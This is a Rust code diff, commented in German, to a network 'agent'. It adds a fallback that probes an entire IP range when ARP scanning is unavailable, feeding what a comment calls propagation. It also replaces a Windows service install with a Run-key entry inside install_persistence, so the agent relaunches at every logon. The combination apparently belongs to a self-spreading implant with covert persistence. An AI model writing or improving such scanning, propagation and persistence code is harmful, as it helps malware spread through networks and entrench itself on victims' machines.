@@ -16,7 +16,7 @@ use clap::Parser;
 
 use kx_core::persist::Invocation;
 
-use tracing::{error, info};
+use tracing::{error, info, warn};
 
 /// Bearer-Token, dessen Debug-Ausgabe den Wert maskiert.
 ///
@@ -240,8 +240,24 @@ async fn main() {
         match kx_scanner::arp_sweep(&args.iface, &range_start, &range_end, &own_ip, &own_mac) {
             Ok(h) => h,
             Err(e) => {
-                error!("ARP-Sweep fehlgeschlagen: {e}");
-                std::process::exit(1);
+                // Ohne ARP (Windows, macOS ohne CAP_NET_RAW) fragt der Agent
+                // das Netz nicht ab, sondern klopft den Bereich ab: der
+                // TCP-Scan in der Propagation entscheidet, wer antwortet.
+                info!("ARP-Sweep nicht verfuegbar ({e}) — Bereich wird abgeklopft");
+                if kx_scanner::bereich_ist_zu_gross(range_start, range_end) {
+                    warn!(
+                        "Bereich {range_start} bis {range_end} ist zu gross — \
+                         nur die ersten {} Adressen werden abgeklopft",
+                        kx_scanner::range::MAX_BEREICH
+                    );
+                }
+                kx_scanner::ip_range(range_start, range_end)
+                    .into_iter()
+                    .map(|ip| kx_scanner::DiscoveredHost {
+                        mac: [0; 6],
+                        ip: ip.into(),
+                    })
+                    .collect()
             }
         }
     };
@@ -349,8 +365,10 @@ async fn install_persistence(args: &Args) -> Result<(), Box<dyn std::error::Erro
     let invocation = args.persistence_invocation(exe);
     #[cfg(target_os = "windows")]
     {
-        kx_win::install_service(&invocation, "Kx Agent").await?;
-        kx_win::start_service(&invocation.name).await?;
+        // Kein Dienst: der Agent meldet sich beim Start nie beim Service
+        // Control Manager, der bricht nach 30 Sekunden mit "FAILED 1053" ab.
+        // Der Run-Key startet ihn bei jeder Anmeldung.
+        kx_win::install_run_key(&invocation).await?;
     }
     #[cfg(unix)]
     {
